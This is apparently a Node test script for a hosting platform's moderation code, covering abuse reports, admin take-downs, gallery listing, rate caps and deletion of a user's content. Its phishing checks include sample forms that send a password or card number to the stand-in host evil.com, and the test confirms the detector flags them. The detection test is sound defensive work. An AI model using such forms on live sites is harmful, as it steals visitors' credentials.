// Offline test for the report / take-down / gallery / publish-check server code, with
// fetch (Base44) and the KV namespace faked. Run: node scripts/test-moderation.mjs
const R = new URL("../", import.meta.url).pathname;
const F = R + "functions/api/apps/6a8b5eb7787b8a4d6a18f662/functions/";
const store = new Map(); let writes = 0;
const kv = {
  async get(k, t) { const v = store.get(k); return v == null ? null : t === "json" ? JSON.parse(v) : v; },
  async put(k, v) { writes++; store.set(k, String(v)); },
  async delete(k) { store.delete(k); },
  async list({ prefix }) { return { keys: [...store.keys()].filter((k) => k.startsWith(prefix)).map((name) => ({ name })) }; },
};
const entities = { PublishedSite: [{ id: "s1", name: "nova", html: "https://nebuluxai.pages.dev/published/site/nova", created_by_id: "u1" },
  { id: "s2", name: "old", html: "<html><body>legacy</body></html>", created_by_id: "u2" }] };
const users = { admintok: { id: "a1", role: "admin" }, usertok: { id: "u1", role: "user" } };
const puts = [];
globalThis.fetch = async (url, opts = {}) => {
  const u = new URL(url); const auth = (opts.headers && opts.headers.authorization) || "";
  const tok = auth.replace("Bearer ", "");
  let body;
  if (u.pathname.endsWith("/entities/User/me")) body = users[tok] || null;
  else if (u.pathname.includes("/entities/Published")) {
    const ent = u.pathname.split("/entities/")[1].split("/");
    if (opts.method === "PUT") { puts.push([ent[1], JSON.parse(opts.body)]); const r = entities[ent[0]].find((x) => x.id === ent[1]); Object.assign(r, JSON.parse(opts.body)); body = r; }
    else if (opts.method === "POST") body = { id: "new" };
    else { const q = JSON.parse(u.searchParams.get("q")); body = (entities[ent[0]] || []).filter((x) => x.name === q.name); }
  } else body = {};
  if (body === null) return new Response("no", { status: 401 });
  return new Response(JSON.stringify(body), { status: 200 });
};
const req = (body, tok, ip = "1.1.1.1") => new Request("https://x/api", { method: "POST", body: JSON.stringify(body),
  headers: { "content-type": "application/json", "cf-connecting-ip": ip, ...(tok ? { authorization: "Bearer " + tok } : {}) } });
const env = { PUBLISHED_HTML: kv };
const report = await import(F + "report-site.js");
const admin = await import(F + "admin-reports.js");
const pub = await import(F + "publish-site.js");
const serve = await import(R + "functions/published/[kind]/[name].js");
const { findCredentialForm } = await import(R + "cloudflare-lib/phishing.js");
const j = async (p) => { const r = await p; return [r.status, await r.json()]; };
const assert = (c, m) => { if (!c) { console.error("FAIL", m); process.exitCode = 1; } else console.log("ok", m); };

let [s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "phishing", details: "steals pw" }), env }));
assert(s === 200 && b.ok && !b.duplicate, "report added");
[s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "scam" }), env }));
assert(b.duplicate && writes === 1, "same IP duplicate, no extra write");
[s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "scam" }, null, "2.2.2.2"), env }));
assert(!b.duplicate && writes === 2, "second IP counted");
[s, b] = await j(report.onRequestPost({ request: req({ name: "ghost", reason: "scam" }), env }));
assert(s === 404, "unknown site 404");
[s, b] = await j(report.onRequestPost({ request: req({ name: "nova", reason: "bogus" }), env }));
assert(s === 400, "bad reason 400");

[s, b] = await j(admin.onRequestPost({ request: req({ action: "list" }, "usertok"), env }));
assert(s === 403, "non-admin blocked");
[s, b] = await j(admin.onRequestPost({ request: req({ action: "list" }, "admintok"), env }));
assert(b.reports.length === 1 && b.reports[0].count === 2 && b.reports[0].reports[0].label.startsWith("Phishing"), "admin lists reports");

store.set("site:nova", "<html><body>hi</body></html>");
let page = await serve.onRequestGet({ params: { kind: "site", name: "nova" }, env });
let html = await page.text();
assert(html.includes("Report") && html.includes("blackhole-checkout") && html.indexOf("Report") < html.indexOf("</body>"), "report link + bridge injected");

[s, b] = await j(admin.onRequestPost({ request: req({ action: "hide", kind: "site", name: "nova" }, "admintok"), env }));
assert(b.reports.length === 0 && b.hidden.length === 1 && b.hidden[0].name === "nova", "hide clears reports, listed as hidden");
assert(entities.PublishedSite[0].hidden === true, "entity marked hidden");
html = await (await serve.onRequestGet({ params: { kind: "site", name: "nova" }, env })).text();
assert(html.includes("has been removed") && !html.includes("hi</body>"), "hidden site shows removed page");

[s, b] = await j(pub.onRequestPost({ request: req({ name: "nova", html: "<p>again</p>" }, "usertok"), env }));
assert(s === 403, "owner cannot re-publish hidden site");

[s, b] = await j(admin.onRequestPost({ request: req({ action: "hide", kind: "site", name: "old" }, "admintok"), env }));
assert(store.get("site:old").includes("legacy") && entities.PublishedSite[1].html.includes("/published/site/old"), "legacy site copied to KV on hide");

[s, b] = await j(admin.onRequestPost({ request: req({ action: "unhide", kind: "site", name: "nova" }, "admintok"), env }));
assert(b.hidden.length === 1 && entities.PublishedSite[0].hidden === false, "unhide");
html = await (await serve.onRequestGet({ params: { kind: "site", name: "nova" }, env })).text();
assert(html.includes("hi</body>") || html.includes("hi<script"), "back online");

[s, b] = await j(pub.onRequestPost({ request: req({ name: "nova", html: '<form action="https://evil.com/x"><input type="password"></form>' }, "usertok"), env }));
assert(s === 422 && b.error.includes("evil.com"), "phishing form refused: " + b.error);
assert(findCredentialForm('<form action="https://evil.com"><input name="cardNumber"></form>'), "card form caught");
assert(!findCredentialForm('<form><input type="password"></form>'), "local password form ok");
assert(!findCredentialForm('<form action="/login"><input type="password"></form>'), "relative ok");
assert(findCredentialForm("<form action=//evil.com><input type=password>"), "unquoted, protocol-relative, unclosed caught");
assert(!findCredentialForm('<form action="https://evil.com"><input name="email"></form>'), "newsletter form ok");
[s, b] = await j(pub.onRequestPost({ request: req({ name: "nova", html: "<p>fine</p>" }, "usertok"), env }));
assert(s === 200 && b.ok, "normal publish ok after unhide");

// ---- showcase ----
const sc = await import(F + "showcase.js");
const call = (body, tok) => j(sc.onRequest({ request: req(body, tok), env }));
[s, b] = await call({ action: "list" });
assert(s === 200 && b.sites.length === 0, "empty gallery");
[s, b] = await call({ action: "set", name: "nova", on: true, title: "Nova store" });
assert(s === 401, "set needs sign-in");
[s, b] = await call({ action: "set", name: "old", on: true }, "usertok");
assert(s === 403, "non-owner refused");
const w0 = writes;
[s, b] = await call({ action: "set", name: "nova", on: true, title: "Nova store" }, "usertok");
assert(b.ok && b.sites[0].name === "nova" && b.sites[0].title === "Nova store" && !("owner" in b.sites[0]) && writes === w0 + 1, "owner adds, owner id not exposed");
[s, b] = await call({ action: "list" });
assert(b.sites.length === 1, "public list");
[s, b] = await call({ action: "set", name: "old", on: true }, "admintok");
assert(s === 400, "blocked/hidden site can't join");
await admin.onRequestPost({ request: req({ action: "hide", kind: "site", name: "nova" }, "admintok"), env });
[s, b] = await call({ action: "list" });
assert(b.sites.length === 0, "taking a site down removes it from the gallery");

// ---- report caps ----
const rep = await import(R + "cloudflare-lib/reports.js");
const w1 = writes;
const res = [];
for (let i = 0; i < 7; i++) res.push(await rep.addReport(kv, { kind: "site", name: "s" + i, reason: "scam", who: "9.9.9.9" }));
assert(res.slice(0, 5).every((r) => r === "added") && res[5] === "limited" && res[6] === "limited" && writes === w1 + 5, "5 reports per visitor per day: " + res.join(","));
for (let i = 0; i < 150; i++) await rep.addReport(kv, { kind: "site", name: "t" + i, reason: "scam", who: "ip" + i });
const all = JSON.parse(store.get("reports"));
assert(all._day.n === 100, "daily cap of 100 report writes (n=" + all._day.n + ")");
const listed = await rep.readReports(kv);
assert(!("_day" in listed), "counters hidden from the Monitor list");
[s, b] = await j(admin.onRequestPost({ request: req({ action: "list" }, "admintok"), env }));
assert(b.reports.every((p) => p.name && Array.isArray(p.reports)), "admin list still clean");

// ---- injected scripts don't pile up on edit + republish ----
entities.PublishedSite.push({ id: "s3", name: "cafe", html: "https://nebuluxai.pages.dev/published/site/cafe", created_by_id: "u1" });
store.set("site:cafe", "<html><body><h1>Cafe</h1></body></html>");
const serveCafe = async () => (await serve.onRequestGet({ params: { kind: "site", name: "cafe" }, env })).text();
let served = await serveCafe();
for (let i = 0; i < 3; i++) {
  [s, b] = await j(pub.onRequestPost({ request: req({ name: "cafe", html: served }, "usertok"), env }));
  served = await serveCafe();
}
const count = (h, t) => h.split(t).length - 1;
assert(s === 200 && count(served, "blackhole-checkout") === 1 && count(served, "Report</a>") === 1, "one bridge + one report link after 3 edit/republish rounds");
assert(!store.get("site:cafe").includes("data-bh"), "injected scripts not stored");
const legacyBridge = '<script>(function(){if(window.top!==window)return;window.addEventListener("message",function(e){var d=e.data;if(e.source!==window||!d||d.type!=="blackhole-checkout")return;location.href="x";});})();</script>';
store.set("site:cafe", "<html><body><h1>Cafe</h1>" + legacyBridge + legacyBridge + "</body></html>");
served = await serveCafe();
assert(count(served, "blackhole-checkout") === 1 && served.includes("<h1>Cafe</h1>"), "old unmarked bridges cleaned on serve");

// ---- delete-my-content ----
const del = await import(F + "delete-my-content.js");
// u1 owns nova (taken down earlier, then restored), cafe and s1-style rows; give u1 a game and a draft too.
entities.PublishedGame = [{ id: "g1", name: "zap", created_by_id: "u1" }, { id: "g2", name: "other", created_by_id: "u2" }];
store.set("game:zap", "<html>game</html>"); store.set("game:other", "<html>theirs</html>");
store.set("draft:u1", "{}");
await sc.onRequest({ request: req({ action: "set", name: "cafe", on: true }, "usertok"), env });
store.set("blocked:site:nova", "x"); // pretend nova is taken down again
const deletes = [];
const realFetch = globalThis.fetch;
globalThis.fetch = async (url, opts = {}) => {
  const u = new URL(url);
  if (opts.method === "DELETE") { deletes.push(u.pathname.split("/entities/")[1]); return new Response("{}", { status: 200 }); }
  if (u.pathname.includes("/entities/Published") && u.searchParams.get("q")?.includes("created_by_id")) {
    const ent = u.pathname.split("/entities/")[1];
    const q = JSON.parse(u.searchParams.get("q"));
    return new Response(JSON.stringify(entities[ent].filter((x) => x.created_by_id === q.created_by_id)));
  }
  return realFetch(url, opts);
};
[s, b] = await j(del.onRequestPost({ request: req({}, "usertok"), env }));
globalThis.fetch = realFetch;
assert(s === 200 && b.sites === 2 && b.games === 1, "deleted 2 sites + 1 game: " + JSON.stringify(b));
assert(deletes.sort().join(",") === "PublishedGame/g1,PublishedSite/s1,PublishedSite/s3", "only the user's own records deleted: " + deletes);
assert(!store.has("site:cafe") && !store.has("game:zap") && !store.has("draft:u1"), "their HTML and draft removed");
assert(store.has("site:nova") && store.has("game:other") && store.has("site:old"), "taken-down page kept as a record; others' pages kept");
[s, b] = await call({ action: "list" });
assert(!b.sites.some((x) => x.name === "cafe"), "removed from the gallery");
[s, b] = await j(del.onRequestPost({ request: req({}), env }));
assert(s === 401, "delete-my-content needs sign-in");
